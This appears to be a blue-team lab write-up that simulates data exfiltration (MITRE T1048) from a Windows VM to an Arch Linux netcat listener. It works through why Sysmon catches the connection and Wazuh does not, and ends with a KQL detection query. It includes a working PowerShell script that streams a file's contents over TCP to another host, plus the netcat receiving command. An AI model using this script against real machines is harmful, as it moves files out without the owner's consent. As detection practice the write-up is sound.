# Data Exfiltration Detection Simulation Summary

## Attack Overview
- **Description**: Simulated data exfiltration by transferring a test file from Windows to an Arch Linux Netcat listener on port 4444, mimicking unauthorized data theft.
- **MITRE ATT&CK**: [T1048 - Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)
- **Objective**: Detect outbound traffic on non-standard ports.
- **Date and Time**: June 13, 2025, ~11:11 PM IST

## Simulation Details
- **Environment**: Windows 10 VM (hostname: `DESKTOP-FF0MPJM`, Wazuh agent: `SIEM-Target-Windows`), Arch Linux VM (IP: 192.168.1.55).
- **Sysmon Config**: SwiftOnSecurity `sysmonconfig-export.xml`.
- **Simulation Scripts**:
  - Windows:
    ```powershell
    $serverIp = "192.168.1.55"
    $port = 4444
    $filePath = "C:\Users\Public\exfil_test.txt"
    $client = New-Object System.Net.Sockets.TcpClient($serverIp, $port)
    $stream = $client.GetStream()
    $fileContent = Get-Content -Path $filePath -Raw
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.Write($fileContent)
    $writer.Flush()
    $writer.Close()
    $stream.Close()
    $client.Close()
    ```
  - Arch Linux:
    ```bash
    nc -l -p 4444 > /tmp/exfil_received.txt
    ```
- **Execution**: Ran Netcat listener on Arch Linux, then `data_exfiltration.ps1` on Windows.
- **Expected Events**:
  - **Sysmon Event ID 3**: `powershell.exe` connection to `192.168.1.55:4444`.

## Detection
- **Sysmon Detection**:
  - Confirmed in Event Viewer (`Microsoft-Windows-Sysmon/Operational`):
    - Event ID 3 at `2025-06-13 17:41:55.159`.
    - Fields: `Image: powershell.exe`, `DestinationIp: 192.168.1.55`, `DestinationPort: 4444`.
- **Wazuh Detection**:
  - Expected Wazuh rule: `61605` (Event ID 3).
  - Search Query (Wazuh Dashboard > Security Events > Discover):
    ```kql
    win.eventdata.destinationPort:4444 OR win.eventdata.image:powershell.exe
    ```
  - **Issue**: No alerts in Wazuh dashboard.
  - **Troubleshooting**:
    - Verified `ossec.conf` includes `<location>Microsoft-Windows-Sysmon/Operational</location>`.
    - Checked Wazuh agent status (`Running`) and connectivity to manager.
    - Re-ran simulation to generate fresh event.
    - Broadened Wazuh query: `agent.name:SIEM-Target-Windows AND sysmon`.
    - Next steps: Check Wazuh manager logs (`/var/ossec/logs/ossec.log`) for parsing errors.
- **Screenshots**:
  - `screenshots\event_viewer_sysmon.png`: Sysmon Event ID 3.
  - `screenshots\wazuh_alerts_exfiltration.png`: Wazuh query (no results).
  - `screenshots\arch_netcat.png`: Arch Linux Netcat output.
- **Logs**:
  - `logs\sysmon_events.csv`: Sysmon events.
  - `logs\wazuh_agent_filtered.log`: Wazuh agent logs.
  - `logs\exfil_received.txt`: Received file.

## Learnings
- **Blue Teaming Insight**: Sysmon effectively logs network activity on non-standard ports, but SIEM integration requires robust configuration.
- **Challenges**: Missing Wazuh alerts highlight the importance of verifying log pipelines (agent to manager).
- **Technical Growth**: Learned to troubleshoot Wazuh agent issues and interpret Sysmon network events.
- **Best Practice**: Regularly audit SIEM log collection and test with known events.

## Detection Logic Query
```kql
event.code:3 AND (win.eventdata.destinationPort:4444 OR win.eventdata.image:powershell.exe) AND @timestamp:>=now-10m
```
- **Purpose**: Detects exfiltration on port 4444 or by `powershell.exe`.

## References
- [MITRE ATT&CK: Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)
- [Wazuh Documentation: Sysmon Integration](https://documentation.wazuh.com/current/user-manual/capabilities/sysmon.html)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)

## Attachments
- **Logs**: [logs](/DetectAndDefend/Phase1/secnario-3-Data-Exfiltration/logs/log1.json)
- **Screenshots**: 
1. [ Sysmon Log Detection in Windows ](/DetectAndDefend/Phase1/secnario-3-Data-Exfiltration/screenshots/sysmon-event-log)
2. [Powershell Script Execution ](/DetectAndDefend/Phase1/secnario-3-Data-Exfiltration/screenshots/windows-script-execution-with-nc.-and-script.png)
3. [Arch Linux Netcat Listener for File from Windows ](/DetectAndDefend/Phase1/secnario-3-Data-Exfiltration/screenshots/arch-linux-nc-listener-with-script.png)
4. [Wazuh Dashboard with Event Log ](/DetectAndDefend/Phase1/secnario-3-Data-Exfiltration/screenshots/wazuh-dashboard-events-logged.png)
